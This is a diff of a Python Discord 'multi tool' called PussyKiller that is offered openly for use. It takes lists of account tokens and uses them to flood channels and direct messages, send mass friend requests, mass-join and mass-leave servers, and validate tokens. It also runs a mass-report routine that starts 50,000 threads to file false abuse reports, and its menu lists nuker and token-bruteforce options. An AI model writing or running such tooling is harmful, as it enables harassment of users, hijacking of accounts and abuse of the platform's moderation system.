@@ -1,9 +1,37 @@
 # Made by Lososik | https://github.com/Lososiik | https://dsc.gg/deadd
 # You need to have tokens.txt at same folder, at tokens.txt put your own tokens. For token bruteforcer you need to create .txt file named grab.txt
-# You need to write to cmd: pip install discord, pip install pyautoui, pip install requests. Without it, the code will not work.
+# You need to write to cmd: pip install discord, pip install pyautoui, pip install requests, pip install websocket, pip install emoji, pip install json, pip intall base64, pip install colorama. Without it, the code will not work.
 # © PussyKiller discord multi tool
 
+
+
+#Copyright (c) 2021 Lososik
+
+#Permission is hereby granted, free of charge, to any person
+#obtaining a copy of this software and associated documentation
+#files (the "Software"), to deal in the Software without
+#restriction, including without limitation the rights to use,
+#copy, modify, merge, publish, distribute, sublicense, and/or sell
+#copies of the Software, and to permit persons to whom the
+#Software is furnished to do so, subject to the following
+#conditions:
+
+#The above copyright notice and this permission notice shall be
+#included in all copies or substantial portions of the Software.
+
+#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
+#EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
+#OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
+#NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
+#HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
+#WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+#FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
+#OTHER DEALINGS IN THE SOFTWARE.
+
+
+
 import threading
+import colorama
 from discord.ext import commands
 import discord
 import pyautogui
@@ -20,6 +48,15 @@ from requests import Session
 import base64
 import string
 import sys
+from colorama import Fore
+import os
+import emoji as ej
+import websocket
+from os import system
+
+
+title = 'PussyKiller'
+system(f'title {title}')
 
 
 def randstr(lenn):
@@ -30,36 +67,76 @@ def randstr(lenn):
     return text
 
 
-def friender(token, user):
-    try:
-        user = user.split("#")
-        headers = {
-            "accept": "*/*",
-            "accept-encoding": "gzip, deflate, br",
-            "accept-language": "en-GB",
-            "authorization": token,
-            "content-length": "90",
-            "content-type": "application/json",
-            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
-            "origin": "https://discord.com",
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-origin",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
-            "x-debug-options": "bugReporterEnabled",
-            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
-        }
-        payload = {"username": user[0], "discriminator": user[1]}
-        src = requests.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,
-                            json=payload)
-        if src.status_code == 204:
-            print(f"[+] Friend request sent to {user[0]}#{user[1]}! [{token}]")
-    except Exception as e:
-        print(e)
+def spammer():
+    colorama.init()
+    print('')
+    print(f' {Fore.LIGHTMAGENTA_EX}╔═╗╔╦╗╔══╗╔══╗╔═╦╗     ╔╦╗╔══╗╔╗─╔╗─╔═╗╔═╗')
+    print(f' ║╬║║║║║══╣║══╣╚╗║║     ║╔╝╚║║╝║║─║║─║╦╝║╬║')
+    print(f' ║╔╝║║║╠══║╠══║╔╩╗║     ║╚╗╔║║╗║╚╗║╚╗║╩╗║╗╣{Fore.RESET}')
+    print(f' {Fore.WHITE}╚╝─╚═╝╚══╝╚══╝╚══╝     ╚╩╝╚══╝╚═╝╚═╝╚═╝╚╩╝{Fore.RESET}')
 
 
-def DMSpammer(idd, message, token):
-        header = {
+    print(f" {Fore.LIGHTMAGENTA_EX}                           Made by Lososik{Fore.RESET}")
+    print(f'{Fore.LIGHTMAGENTA_EX}╔══════════════════╦═══════════════════════╗{Fore.RESET}')
+    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Spammer       {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[9]{Fore.RESET} Webhook Spammer    {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
+    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} DM Spammer    {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[10]{Fore.RESET} Reaction Spammer  {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
+    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Friend Spammer{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[11]{Fore.RESET} Server Nuker      {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
+    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[4]{Fore.RESET} Joiner        {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[12]{Fore.RESET} Account Nuker     {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
+    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[5]{Fore.RESET} Leaver        {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[13]{Fore.RESET} Send Tokens Online{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
+    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[6]{Fore.RESET} Typing Spammer{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[14]{Fore.RESET} Token Bruteforce  {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
+    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[7]{Fore.RESET} Tokens Checker{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[15]{Fore.RESET} About             {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
+    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[8]{Fore.RESET} MassReport    {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[16]{Fore.RESET} Exit              {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
+    print(f'{Fore.LIGHTMAGENTA_EX}╚══════════════════╩═══════════════════════╝{Fore.RESET}')
+    choice = int(input('[?]>'))
+
+
+    if choice == 1:
+        tokens = open("tokens.txt", "r").read().splitlines()
+        channel = input(f'Chanel ID: ')
+        mess = input(f'Message: ')
+        delay = float(input(f'Delay: '))
+
+        def spam(token, mess):
+            url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
+            data = {"content": mess}
+            header = {"authorization": token}
+
+            while True:
+                time.sleep(delay)
+                src = requests.post(url, data, headers=header)
+                if src.status_code == 429:
+                    ratelimit = json.loads(src.content)
+                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for", str(float(ratelimit['retry_after'])) + " seconds")
+                    time.sleep(float(ratelimit['retry_after']))
+
+                elif src.status_code == 200:
+                    print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')
+
+                elif src.status_code == 401:
+                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
+                elif src.status_code == 404:
+                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
+                elif src.status_code == 403:
+                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')
+
+        def thread():
+            text = mess
+            for token in tokens:
+                threading.Thread(target=spam, args=(token, text)).start()
+
+        start = input(f'Press eny key to start: ')
+        start = thread()
+
+        time.sleep(5)
+        exit = input(f'press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
+        exit = spammer()
+
+
+    if choice == 2:
+        def DMSpammer(idd, message, token):
+            header = {
                 'Authorization': token,
                 "accept": "*/*",
                 "accept-language": "en-GB",
@@ -75,137 +152,88 @@ def DMSpammer(idd, message, token):
                 "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
             }
 
-        payload = {'recipient_id': idd}
-        r1 = requests.post(f'https://discordapp.com/api/v9/users/@me/channels', headers=header,
-                           json=payload)
+            payload = {'recipient_id': idd}
+            r1 = requests.post(f'https://discordapp.com/api/v9/users/@me/channels', headers=header,
+                               json=payload)
 
-        payload = {"content": message, "tts": False}
-        j = json.loads(r1.content)
-
-        while True:
-            r2 = requests.post(f"https://discordapp.com/api/v9/channels/{j['id']}/messages",
-                               headers=header, json=payload)
-
-            if r2.status_code == 429:
-                ratelimit = json.loads(r2.content)
-                print("Ratelimit for", str(float(ratelimit['retry_after'])) + " seconds")
-                time.sleep(float(ratelimit['retry_after']))
-
-            elif r2.status_code == 200:
-                print(f"[+] DM sent to {idd}!")
-
-
-def spammer():
-    print("")
-    print("▒█▀▀█ █░░█ █▀▀ █▀▀ █░░█ 　 ▒█░▄▀ ░▀░ █░░ █░░ █▀▀ █▀▀█")
-    print("▒█▄▄█ █░░█ ▀▀█ ▀▀█ █▄▄█ 　 ▒█▀▄░ ▀█▀ █░░ █░░ █▀▀ █▄▄▀")
-    print("▒█░░░ ░▀▀▀ ▀▀▀ ▀▀▀ ▄▄▄█ 　 ▒█░▒█ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░▀▀")
-
-    print("                                      Made by Lososik")
-
-    print('[1] Spammer        [8] Webhook spammer')
-    print('[2] DM Spammer     [9] Nuker')
-    print('[3] Friend spammer [10] Account Nuker')
-    print('[4] Joiner         [11] MassReport')
-    print('[5] Leaver         [12] Token Bruteforce')
-    print('[6] Typing spammer [13] About')
-    print('[7] Token checker  [14] Exit')
-
-    choice = int(input('[?]> '))
-
-
-    if choice == 1:
-        print("")
-        print('█▀█ █░█ █▀ █▀ █▄█   █▄▀ █ █░░ █░░ █▀▀ █▀█   █▀ █▀█ ▄▀█ █▀▄▀█ █▀▄▀█ █▀▀ █▀█')
-        print('█▀▀ █▄█ ▄█ ▄█ ░█░   █░█ █ █▄▄ █▄▄ ██▄ █▀▄   ▄█ █▀▀ █▀█ █░▀░█ █░▀░█ ██▄ █▀▄')
-
-        tokens = open("tokens.txt", "r").read().splitlines()
-        channel = input('Chanel ID: ')
-        mess = input('Message: ')
-        delay = float(input('Delay: '))
-
-        def spam(token, mess):
-            url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
-            data = {"content": mess}
-            header = {"authorization": token}
+            payload = {"content": message, "tts": False}
+            j = json.loads(r1.content)
 
             while True:
-                time.sleep(delay)
-                src = requests.post(url, data, headers=header)
-                if src.status_code == 429:
-                    ratelimit = json.loads(src.content)
-                    print("Ratelimit for", str(float(ratelimit['retry_after'])) + " seconds")
+                r2 = requests.post(f"https://discordapp.com/api/v9/channels/{j['id']}/messages",
+                                   headers=header, json=payload)
+
+                if r2.status_code == 429:
+                    ratelimit = json.loads(r2.content)
+                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for", str(float(ratelimit['retry_after'])) + " seconds")
                     time.sleep(float(ratelimit['retry_after']))
 
-                elif src.status_code == 401:
-                    print('Invalid token')
-                elif src.status_code == 404:
-                    print('Not found ¯\_(ツ)_/¯')
-                elif src.status_code == 403:
-                    print('Token havent got access to this channel')
+                elif r2.status_code == 200:
+                    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}DM sent to {idd}!")
 
-        def thread():
-            text = mess
-            for token in tokens:
-                threading.Thread(target=spam, args=(token, text)).start()
-
-        start = input('Press eny key to start: ')
-        start = thread()
-
-        exit = input('press any key: ')
-        exit = spammer()
-
-
-    if choice == 2:
-        print('''
-╭━╮╱╭━┳━╮╱╱╭┳┳╮╱╱╱╱╱╱╱╱╭━━┳━┳━╮╭━━╮
-┃╋┣┳┫━┫━╋┳╮┃╭╋╋╮╭╮╭━┳┳╮╰╮╮┃┃┃┃┃┃━━╋━┳━╮╭━━┳━━┳━┳┳╮
-┃╭┫┃┣━┣━┃┃┃┃╰┫┃╰┫╰┫┻┫╭╯╭┻╯┃┃┃┃┃┣━━┃╋┃╋╰┫┃┃┃┃┃┃┻┫╭╯
-╰╯╰━┻━┻━╋╮┃╰┻┻┻━┻━┻━┻╯╱╰━━┻┻━┻╯╰━━┫╭┻━━┻┻┻┻┻┻┻━┻╯
-╱╱╱╱╱╱╱╱╰━╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╯''')
 
         tokens = open("tokens.txt", "r").read().splitlines()
-        user = input("User ID: ")
-        message = input("Message: ")
+        user = input(f"User ID: ")
+        message = input(f"Message: ")
 
         def thread():
             for token in tokens:
                 threading.Thread(target=DMSpammer, args=(user, message, token)).start()
 
-        start = input('Press enter to start: ')
+        start = input(f'Press enter to start: ')
         start = thread()
 
-        exit = input('press any key: ')
+        time.sleep(5)
+        exit = input(f'press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
         exit = spammer()
 
 
     if choice == 3:
-        print('''╔═══╗─────────────╔╗╔═╗╔╗╔╗──────╔═══╗──────────╔╗
-║╔═╗║─────────────║║║╔╝║║║║──────║╔══╝──────────║║
-║╚═╝╠╗╔╦══╦══╦╗─╔╗║╚╝╝╔╣║║║╔══╦═╗║╚══╦═╦╦══╦═╗╔═╝╠══╦═╗╔══╦══╦══╦╗╔╦╗╔╦══╦═╗
-║╔══╣║║║══╣══╣║─║║║╔╗║╠╣║║║║║═╣╔╝║╔══╣╔╬╣║═╣╔╗╣╔╗║║═╣╔╝║══╣╔╗║╔╗║╚╝║╚╝║║═╣╔╝
-║║──║╚╝╠══╠══║╚═╝║║║║╚╣║╚╣╚╣║═╣║─║║──║║║║║═╣║║║╚╝║║═╣║─╠══║╚╝║╔╗║║║║║║║║═╣║
-╚╝──╚══╩══╩══╩═╗╔╝╚╝╚═╩╩═╩═╩══╩╝─╚╝──╚╝╚╩══╩╝╚╩══╩══╩╝─╚══╣╔═╩╝╚╩╩╩╩╩╩╩══╩╝
-─────────────╔═╝║─────────────────────────────────────────║║
-─────────────╚══╝─────────────────────────────────────────╚╝ ''')
+        def friender(token, user):
+            try:
+                user = user.split("#")
+                headers = {
+                    "accept": "*/*",
+                    "accept-encoding": "gzip, deflate, br",
+                    "accept-language": "en-GB",
+                    "authorization": token,
+                    "content-length": "90",
+                    "content-type": "application/json",
+                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
+                    "origin": "https://discord.com",
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "same-origin",
+                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
+                    "x-debug-options": "bugReporterEnabled",
+                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
+                }
+                payload = {"username": user[0], "discriminator": user[1]}
+                src = requests.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,
+                                    json=payload)
+                if src.status_code == 204:
+                    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Friend request sent to {user[0]}#{user[1]}!")
+            except Exception as e:
+                print(e)
 
-
-        user = input("Username + Tag: ")
+        user = input(f"Username + Tag: ")
         tokens = open("tokens.txt", "r").read().splitlines()
-        delay = float(input('Delay: '))
+        delay = float(input(f'Delay: '))
         for token in tokens:
             time.sleep(delay)
             threading.Thread(target=friender, args=(token, user)).start()
 
-        exit = input('press any key: ')
+
+        time.sleep(5)
+        exit = input(f'press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
         exit = spammer()
 
 
     if choice == 4:
-        print('')
-        print('█▀█ █░█ █▀ █▀ █▄█   █▄▀ █ █░░ █░░ █▀▀ █▀█   ░░█ █▀█ █ █▄░█ █▀▀ █▀█')
-        print('█▀▀ █▄█ ▄█ ▄█ ░█░   █░█ █ █▄▄ █▄▄ ██▄ █▀▄   █▄█ █▄█ █ █░▀█ ██▄ █▀▄')
-
 
         http.client._is_legal_header_name = re.compile(rb'[^\s][^:\r\n]*').fullmatch
 
@@ -239,12 +267,12 @@ def spammer():
             requests.post("https://discordapp.com/api/v9/invites/" + invite, headers=headers)
 
 
-        invite = input("Discord server invite: ")
+        invite = input(f"Discord server invite: ")
         invite = invite.replace("https://discord.gg/", "")
         invite = invite.replace("discord.gg/", "")
         invite = invite.replace("https://discord.com/invite/", "")
 
-        delay = float(input('Delay: '))
+        delay = float(input(f'Delay: '))
 
 
         for token in tokens:
@@ -252,22 +280,20 @@ def spammer():
             threading.Thread(target=join, args=(invite, token)).start()
 
 
-        print('[+] Done')
+        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET} Done')
 
-
-        exit = input('press any key: ')
+        time.sleep(5)
+        exit = input(f'press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
         exit = spammer()
 
 
     if choice == 5:
-        print('')
-        print('█▀█ █░█ █▀ █▀ █▄█   █▄▀ █ █░░ █░░ █▀▀ █▀█   █░░ █▀▀ ▄▀█ █░█ █▀▀ █▀█')
-        print('█▀▀ █▄█ ▄█ ▄█ ░█░   █░█ █ █▄▄ █▄▄ ██▄ █▀▄   █▄▄ ██▄ █▀█ ▀▄▀ ██▄ █▀▄')
-
 
         token = open("tokens.txt", "r").read().splitlines()
 
-        ID = input('Discord Server ID: ')
+        ID = input(f'Discord Server ID: ')
 
         apilink = "https://discordapp.com/api/v9/users/@me/guilds/" + str(ID)
 
@@ -279,23 +305,16 @@ def spammer():
                     'Authorization': token
                 }
                 requests.delete(apilink, headers=headers)
-            print('[+] Successfully left guild')
+            print(f'{Fore.GREEN}[+]{Fore.RESET} Successfully left guild')
 
-        exit = input('press any key: ')
+        time.sleep(5)
+        exit = input(f'press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
         exit = spammer()
 
 
     if choice == 6:
-        print('')
-        print('╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╭╮╭╮╱╱╱╱╱╱╱╭╮')
-        print('┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱┃┃┃┃╱╱╱╱╱╱╭╯╰╮')
-        print('┃╰━╯┣╮╭┳━━┳━━┳╮╱╭╮┃┃╭┳┫┃┃┃╭━━┳━╮╰╮╭╋╮╱╭┳━━┳┳━╮╭━━╮╭━━┳━━┳━━┳╮╭┳╮╭┳━━┳━╮')
-        print('┃╭━━┫┃┃┃━━┫━━┫┃╱┃┃┃╰╯╋┫┃┃┃┃┃━┫╭╯╱┃┃┃┃╱┃┃╭╮┣┫╭╮┫╭╮┃┃━━┫╭╮┃╭╮┃╰╯┃╰╯┃┃━┫╭╯')
-        print('┃┃╱╱┃╰╯┣━━┣━━┃╰━╯┃┃╭╮┫┃╰┫╰┫┃━┫┃╱╱┃╰┫╰━╯┃╰╯┃┃┃┃┃╰╯┃┣━━┃╰╯┃╭╮┃┃┃┃┃┃┃┃━┫┃')
-        print('╰╯╱╱╰━━┻━━┻━━┻━╮╭╯╰╯╰┻┻━┻━┻━━┻╯╱╱╰━┻━╮╭┫╭━┻┻╯╰┻━╮┃╰━━┫╭━┻╯╰┻┻┻┻┻┻┻━━┻╯')
-        print('╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃┃┃╱╱╱╱╱╭━╯┃╱╱╱┃┃')
-        print('╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯╰╯╱╱╱╱╱╰━━╯╱╱╱╰╯')
-
 
         message = input("Message: ")
         amount = int(input("Amount of messages: "))
@@ -305,13 +324,13 @@ def spammer():
         ready = input("Press enter when you will be ready: ")
 
 
-        print("10 seconds to typing spam")
+        print(f"{Fore.LIGHTMAGENTA_EX}10 seconds to typing spam{Fore.RESET}")
 
 
         for seconds in range(10, 0, -1):
             print(seconds)
             time.sleep(1)
-        print('Spamming')
+        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Spamming')
 
 
         for i in range(0, amount):
@@ -322,22 +341,20 @@ def spammer():
                 pyautogui.hotkey("ctrl", "v")
                 pyautogui.press("enter")
 
-            print(f'[+] {message} sent')
-            time.sleep(delay / 1000)
+            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET}{message} sent')
+            time.sleep(delay)
 
 
-        print("Done\n")
+        print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done\n")
 
-
+        time.sleep(5)
         exit = input('press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
         exit = spammer()
 
 
     if choice == 7:
-        print('')
-        print('█▀█ █░█ █▀ █▀ █▄█   █▄▀ █ █░░ █░░ █▀▀ █▀█   ▀█▀ █▀█ █▄▀ █▀▀ █▄░█   █▀▀ █░█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█')
-        print('█▀▀ █▄█ ▄█ ▄█ ░█░   █░█ █ █▄▄ █▄▄ ██▄ █▀▄   ░█░ █▄█ █░█ ██▄ █░▀█   █▄▄ █▀█ █▀█ █▄▄ █░█ ██▄ █▀▄')
-
 
         def checker(token):
             response = post(f'https://discord.com/api/v6/invite/{randint(1, 9999999)}',
@@ -358,40 +375,105 @@ def spammer():
                     with open('tokens.txt', 'r') as tokens:
                         for token in tokens.read().split('\n'):
                             if len(token) > 15 and token not in checked and checker(token) == True:
-                                print(f'{token} Valid')
+                                print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{token} Valid')
                                 checked.append(token)
                             else:
-                                print(f'{token}  Invalid')
+                                print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}{token} Invalid')
                     if len(checked) > 0:
                         save = input(f'{len(checked)} Valid\nDo you want to Save only Valid tokens? (y/n): ').lower()
                         if save == 'y':
                             name = 'tokens'
                             with open(f'{name}.txt', 'w') as saveFile:
                                 saveFile.write('\n'.join(checked))
-                            print(f'Tokens saved to {name}.txt file!')
+                            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Tokens saved to {name}.txt file!')
                 except:
-                    input('Error, cant open tokens.txt file...... :(!')
+                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error, cant open tokens.txt file...... :(!')
 
 
         start = input('press any key to start: ')
         start = manager()
 
-
-        exit = input('press any key to return to the menu: ')
+        time.sleep(5)
+        exit = input('press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
         exit = spammer()
 
 
-    if choice == 8:
-        print('''
-┏━━━┓╋╋╋╋╋╋╋╋╋╋╋╋╋┏┓╋╋┏┓┏┓╋╋╋╋╋╋╋╋╋╋╋╋╋╋┏┓╋┏┓╋╋╋╋╋╋╋┏┓
-┃┏━┓┃╋╋╋╋╋╋╋╋╋╋╋╋╋┃┃╋╋┃┃┃┃╋╋╋╋╋╋╋╋╋╋╋╋╋╋┃┃╋┃┃╋╋╋╋╋╋╋┃┃
-┃┗━┛┣┓┏┳━━┳━━┳┓╋┏┓┃┃┏┳┫┃┃┃┏━━┳━┓┏┓┏┓┏┳━━┫┗━┫┗━┳━━┳━━┫┃┏┓┏━━┳━━┳━━┳┓┏┳┓┏┳━━┳━┓
-┃┏━━┫┃┃┃━━┫━━┫┃╋┃┃┃┗┛╋┫┃┃┃┃┃━┫┏┛┃┗┛┗┛┃┃━┫┏┓┃┏┓┃┏┓┃┏┓┃┗┛┛┃━━┫┏┓┃┏┓┃┗┛┃┗┛┃┃━┫┏┛
-┃┃╋╋┃┗┛┣━━┣━━┃┗━┛┃┃┏┓┫┃┗┫┗┫┃━┫┃╋┗┓┏┓┏┫┃━┫┗┛┃┃┃┃┗┛┃┗┛┃┏┓┓┣━━┃┗┛┃┏┓┃┃┃┃┃┃┃┃━┫┃
-┗┛╋╋┗━━┻━━┻━━┻━┓┏┛┗┛┗┻┻━┻━┻━━┻┛╋╋┗┛┗┛┗━━┻━━┻┛┗┻━━┻━━┻┛┗┛┗━━┫┏━┻┛┗┻┻┻┻┻┻┻━━┻┛
-╋╋╋╋╋╋╋╋╋╋╋╋╋┏━┛┃╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┃┃
-╋╋╋╋╋╋╋╋╋╋╋╋╋┗━━┛╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┗┛ ''')
 
+    if choice == 8:
+
+        sent = 0
+        session = Session()
+        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Illegal Content')
+        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Harrassment')
+        print(f'{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Spam or Phishing Links')
+        print(f'{Fore.LIGHTMAGENTA_EX}[4]{Fore.RESET} Self harm')
+        print(f'{Fore.LIGHTMAGENTA_EX}[5]{Fore.RESET} NSFW Content')
+
+
+        tokeen = input("Token: ")
+        headers = {'Authorization': tokeen, 'Content-Type': 'application/json'}
+        r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
+        if r.status_code == 200:
+            pass
+        else:
+            print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Invalid Token{Fore.RESET}")
+            input()
+        id = input("Server ID: ")
+        id1 = input("Channel ID: ")
+        message = input("Message ID: ")
+        reason = input("Option: ")
+
+
+        def Main():
+            global sent
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
+                'Authorization': tokeen,
+                'Content-Type': 'application/json'
+            }
+
+
+            payload = {
+                'channel_id': id1,
+                'guild_id': id,
+                'message_id': message,
+                'reason': reason
+            }
+
+
+            while True:
+                sent = 0
+                r = requests.post('https://discord.com/api/v6/report', headers=headers, json=payload)
+                if r.status_code == 201:
+                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Sent Report{Fore.RESET}")
+                    sent += 1
+
+
+                elif r.status_code == 401:
+                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token")
+                    input()
+
+
+                else:
+                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Error")
+
+
+        print()
+        for i in range(50000):
+            Thread(target=Main).start()
+
+        time.sleep(5)
+        exit = input('press any key: ')
+        clear = lambda: os.system('cls')
+        exit = clear()
+        exit = spammer()
+
+
+
+
+    if choice == 9:
 
         def webhkspammer():
             webhook = input("Webhook Link: ")
@@ -399,173 +481,446 @@ def spammer():
             delay = float(input("Delay: "))
 
             while True:
-                print("Sending: " + message)
-                print(" ")
                 try:
                     time.sleep(delay)
                     _data = requests.post(webhook, json={'content': message})
 
                     if _data.status_code == 204:
-                        print("Sending: " + message)
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{message} sent")
                 except:
-                    print("Error:\n" + webhook)
+                    print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error, or wrong webhook: {Fore.LIGHTRED_EX}{webhook}{Fore.RESET}")
                     time.sleep(5)
 
 
         def thread():
             threading.Thread(target=webhkspammer(), args=(message)).start()
-            print(f'[+] {message} sent')
-
 
         thread()
 
 
-        exit = input('press any key to exit: ')
-        exit = spammer()
-
-
-    if choice == 9:
-        print('')
